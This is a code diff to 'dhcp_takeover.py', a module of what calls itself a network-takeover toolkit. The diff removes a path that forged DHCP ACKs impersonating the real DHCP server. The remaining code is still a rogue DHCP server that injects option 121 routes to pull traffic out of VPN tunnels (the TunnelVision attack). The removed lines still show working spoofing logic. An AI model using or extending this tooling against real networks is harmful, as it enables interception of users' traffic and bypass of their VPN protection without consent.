@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v3.1
+# v3.2
 """
 dhcp_takeover.py — DHCP engine for the network-takeover toolkit.
 
@@ -15,7 +15,6 @@ A library module (no orchestration of its own — see main.py).  Provides:
   Rogue DHCP server:
     A full OFFER / ACK / NAK / RELEASE server with:
       * option 121 classless static routes (TunnelVision / VPN relay)
-      * impersonation of the real server when a client picks it (forged ACKs)
       * DNS mirrored from the real server's offer
 """
 import ipaddress
@@ -52,11 +51,6 @@ DHCP_NAK_TYPES = {6, "nak"}
 DHCP_RELEASE_TYPES = {7, "release"}
 LEASE_HOST_MIN = 2
 LEASE_HOST_MAX = 253
-
-# When True, if a client REQUESTs from the real server (option 54 != us), forge
-# an ACK that impersonates that server but carries our option 121, so the client
-# installs our routes while believing the legitimate server granted the lease.
-IMPERSONATE_REAL_SERVER = True
 
 # Four /2 routes cover the entire IPv4 space and are more specific than a VPN's
 # typical /1 split-tunnel pair, so the kernel prefers them (TunnelVision attack).
@@ -658,7 +652,7 @@ def offer_address_to_discover(packet, networks, proposed_leases, server_details)
 
 
 def ack_request(packet, networks, proposed_leases, server_details):
-    """Respond to a DHCPREQUEST with a DHCPACK (or impersonated ACK), sending NAK when invalid."""
+    """Respond to a DHCPREQUEST with a DHCPACK, sending NAK when invalid."""
     if not packet.haslayer(BOOTP) or not is_dhcp_request(packet):
         print_step("SKIP", "Packet is not a DHCPREQUEST")
         return None
@@ -674,42 +668,6 @@ def ack_request(packet, networks, proposed_leases, server_details):
     server_ip = server_details["source_ip"]
     server_mac = get_server_mac(server_details)
     vlan_id = dhcp_network.get("vlan_id")
-
-    # Impersonation path: client chose a different (real) server via option 54.
-    # Forge an ACK that spoofs that server's IP and option 54 so the client
-    # accepts the lease it asked for, while our option 121 installs our routes.
-    req_server_id = get_dhcp_option(packet, "server_id")
-    if req_server_id and req_server_id != server_ip:
-        proposed_leases.pop(get_proposed_lease_key(packet, dhcp_network), None)
-        if IMPERSONATE_REAL_SERVER:
-            requested_ip = get_requested_or_client_address(packet)
-            if requested_ip and requested_ip != "0.0.0.0":
-                print_step(
-                    "START",
-                    f"IMPERSONATE xid={bootp.xid} client chose {req_server_id}; "
-                    f"forging ACK for {requested_ip} spoofing {req_server_id}",
-                )
-                # Pass req_server_id as server_ip so BOOTP siaddr, IP src, and
-                # option 54 all carry the real server's identity.
-                spoof_ack = build_dhcp_response(
-                    packet,
-                    "ack",
-                    requested_ip,
-                    dhcp_network,
-                    req_server_id,
-                    server_mac,
-                    server_details=server_details,
-                )
-                log_built_dhcp_response("DHCPACK(spoofed)", spoof_ack)
-                sendp(spoof_ack, iface=server_details["interface"], verbose=False)
-                print_step("OK", f"Sent spoofed DHCPACK {requested_ip} as {req_server_id}")
-                answered_xids.add(bootp.xid)
-                return requested_ip
-            else:
-                print_step("SKIP", f"IMPERSONATE skipped: no usable requested IP in xid={bootp.xid}")
-        else:
-            print_step("SKIP", f"Client chose {req_server_id}; impersonation disabled, staying silent")
-        return None
 
     lease_key = get_proposed_lease_key(packet, dhcp_network)
     proposed_lease = proposed_leases.get(lease_key)
@@ -759,7 +717,7 @@ def ack_request(packet, networks, proposed_leases, server_details):
     return offered_ip
 
 
-def handle_dhcp_release(packet, networks, server_details):
+def handle_dhcp_release(packet, networks):
     """Free a released IP back to its network's lease pool."""
     if not packet.haslayer(BOOTP):
         return None
